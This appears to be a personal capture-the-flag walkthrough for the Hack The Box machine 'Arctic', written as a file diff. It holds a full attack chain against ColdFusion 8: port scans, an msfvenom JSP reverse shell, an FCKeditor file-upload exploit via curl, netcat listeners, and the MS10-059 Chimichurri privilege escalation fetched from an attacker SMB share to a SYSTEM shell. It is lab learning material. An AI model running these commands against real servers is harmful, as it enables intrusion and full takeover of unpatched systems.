@@ -1,0 +1,154 @@
+command: sudo rustscan -a 10.10.10.11
+result:
+PORT      STATE SERVICE REASON
+135/tcp   open  msrpc   syn-ack ttl 127
+8500/tcp  open  fmtp    syn-ack ttl 127
+49154/tcp open  unknown syn-ack ttl 127
+
+command: sudo nmap -sSVC -A -p 135,8500,49154 10.10.10.11
+result:
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+access: http://10.10.10.11:8500/
+wait 30 seconds
+
+access: http://10.10.10.11:8500/CFIDE/
+wait 30 seconds
+
+access: http://10.10.10.11:8500/CFIDE/administrator/
+wait 30 seconds
+response:
+coldfusion 8 administrator
+
+command: searchsploit coldfusion 8.0.1
+---------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                  |  Path
+---------------------------------------------------------------- ---------------------------------
+Adobe ColdFusion < 11 Update 10 - XML External Entity Injection | multiple/webapps/40346.py
+Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Quer | cfm/webapps/33170.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatew | cfm/webapps/33167.txt
+Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard | cfm/webapps/33169.txt
+Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/search | cfm/webapps/33168.txt
+ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploi | cfm/webapps/16788.rb
+---------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+create jsp payload:
+command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.19 LPORT=7979 -f raw > shell.jsp
+
+command: curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
+comamnd: rlwrap nc -lvnp 7979
+command: curl 'http://10.10.10.11:8500/userfiles/file/df.jsp'
+
+C:\ColdFusion8\runtime\bin>systeminfo
+systeminfo
+
+Host Name:                 ARCTIC
+OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                55041-507-9857321-84451
+Original Install Date:     22/3/2017, 11:09:45 ��
+System Boot Time:          11/7/2023, 5:23:47 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     6.143 MB
+Available Physical Memory: 5.034 MB
+Virtual Memory: Max Size:  12.285 MB
+Virtual Memory: Available: 11.215 MB
+Virtual Memory: In Use:    1.070 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.11
+get windows  exploit suggester from here:
+https://github.com/gr33nm0nk2802/Windows-Exploit-Suggester
+
+put systeminfo to this sysinfo.txt
+command: . ./venv/bin/activate
+
+command: ./windows-exploit-suggester.py --database 2023-07-10-mssb.xls --systeminfo sysinfo.txt 
+[*]initiating winsploit version 3.3...
+[*]database file detected as xls or xlsx based on extension
+[*]attempting to read from the systeminfo input file
+[+]systeminfo input file read successfully (utf-8)
+[*]querying database file for potential vulnerabilities
+[*]comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
+[*]there are now 197 remaining vulns
+[+][E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+]windows version identified as 'Windows 2008 R2 64-bit'
+[*]
+[M]MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M]MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E]MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]  http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
+[*]  http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
+[*]
+[E]MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M]MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M]MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E]MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E]MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M]MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M]MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+
+take attention:
+[E]MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+
+get exploit from here:
+https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri
+
+upload using sambaserver.py 
+C:\ColdFusion8\runtime\bin>copy \\10.10.16.19\share\Chimichurri.exe
+copy \\10.10.16.19\share\Chimichurri.exe
+Overwrite C:\ColdFusion8\runtime\bin\Chimichurri.exe? (Yes/No/All): Yes
+Yes
+        1 file(s) copied.
+
+command: sudo rlwrap nc -lvnp 443
+
+C:\ColdFusion8\runtime\bin>Chimichurri.exe 10.10.16.19 443
+Chimichurri.exe 10.10.16.19 443
+/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
+
+C:\ColdFusion8\runtime\bin>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+8b8b57e87e6e713c44c08be9a479d612
+
+resource:
+https://0xdf.gitlab.io/2020/05/19/htb-arctic.html#ms10-059
